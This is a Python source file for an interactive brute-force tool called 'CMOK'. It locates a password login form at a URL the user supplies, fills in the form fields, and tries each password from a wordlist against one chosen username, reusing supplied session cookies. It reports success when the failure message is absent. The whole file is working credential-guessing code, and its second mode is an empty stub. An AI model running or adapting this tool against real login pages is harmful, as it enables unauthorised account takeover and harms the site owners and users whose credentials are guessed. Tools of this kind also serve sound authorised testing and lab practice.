import sys
import os
import requests
from bs4 import BeautifulSoup

from termcolor import colored
from importmonkey import add_path

''' Export python module path '''

_i = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _i not in sys.path:
    add_path(_i)

from toolbox.print.banner import *
from toolbox.print.clprinter import *

print_horizontal_delimiter()

mode_input = int(input("# Step 1: Select mode\n"
                       "# You want to attack ONE specific username - type 1\n"
                       "# You don't know a specific username to attack - type 2\n"))
def find_authentication_form(url, cookies=None):
    response = requests.get(url, cookies = {'Cookie': cookies})
    soup = BeautifulSoup(response.content, "html.parser")
    form = None
    for input_field in soup.find_all("input"):
        if input_field.get("type") == "password":
            form = input_field.find_parent("form")
            break
    if form:
        action = form["action"]
        method = form.get("method", "post")
        inputs = form.find_all("input")
        return (action, method, inputs)
    return None


def forge_payload(inputs, username, password):
    payload = {}
    for inp in inputs:
        payload[inp["name"]] = inp.get("value", "")
    payload["username"] = username.strip()
    payload["password"] = password.strip()
    return payload


def attempt_login(url, method, payload, cookies=None):
    if method == "post":
        response = requests.post(url, data=payload, cookies = {'Cookie': cookies})
    else:
        response = requests.get(url, params=payload, cookies = {'Cookie': cookies})
    return response


def read_file_as_list(filename):
    file = open(str(f"{os.path.dirname(os.path.abspath(__file__))}{filename}"), "r")
    li = file.readlines()
    file.close()
    return li


def bruteforce_username(username, passwd_list, url, method, inputs, cookies, fail_label):
    suspicious_success = False
    suspicious_success_content_len = 0
    for password in passwd_list:
        response = attempt_login(url, method, forge_payload(inputs, username, password), cookies)
        if fail_label in response.content.decode():
            print(colored(f"[-] FAIL Username {username} - Password {password}", "red"))
        else:
            if passwd_list.index(password) == 0:
                print("[?] Successful try from 1st attempt looks suspicious, checking...")
                suspicious_success = True
                suspicious_success_content_len = response.content.__len__()
                continue
            if suspicious_success and suspicious_success_content_len == response.content.__len__():
                print(colored("[!] It seems like your input parameters are incorrect, because all username-password pairs seem valid\n"
                              "    Please re-check your input parameters, try to provide cookies also", "magenta"))
                quit()
            print(colored(f"[+] SUCCESS Username {username} - Password {password}", "green"))
            return username, password
    return None


def run_cmok():
    print_horizontal_delimiter()
    print_cmok_banner()
    print_horizontal_delimiter()
    username = input("# Step 2: Type username to attack\n")
    url = input("# Step 3: Copy and paste URL of a page you're attacking\n")
    cookies = input(
        "# Step 4: Type in necessary cookies to access the URL, separated with \';\'. If not present, leave as empty\n"
        "# ex. security=high; PHPSESSID=9943c85c5c1779e8b78c3fb17f20d513\n"
        "# To view cookies in Chrome, go Inspect->Application->Cookies\n")
    fail_label = input("# Step 5: Type in a label or its part that appears when a login is failed\n"
                       "# ex. Login attempt is unsuccessful, please try again\n")
    form = find_authentication_form(url, cookies)
    if form:
        print("# Starting CMOK attack!\n"
              "# Using @wpxmlrpcbrute enhanced common password wordlist\n")
        print_cmok()
        passwd_list = read_file_as_list("/wordlists/passwords.txt")
        action, method, inputs = form
        res_un, res_pass = bruteforce_username(username, passwd_list, url, method, inputs, cookies, fail_label)
        if res_un and res_pass:
            print(f"# Successful bruteforce, found valid credentials Username "
                  + colored(res_un, "green") + " - Password " + colored(res_pass, "green"))
        else:
            print("# Bruteforce attempt failed, aborting...")
            quit()
    else:
        print("# Auth form not detected, exiting...")


if (mode_input == 1):
    run_cmok()
elif (mode_input == 2):
    pass
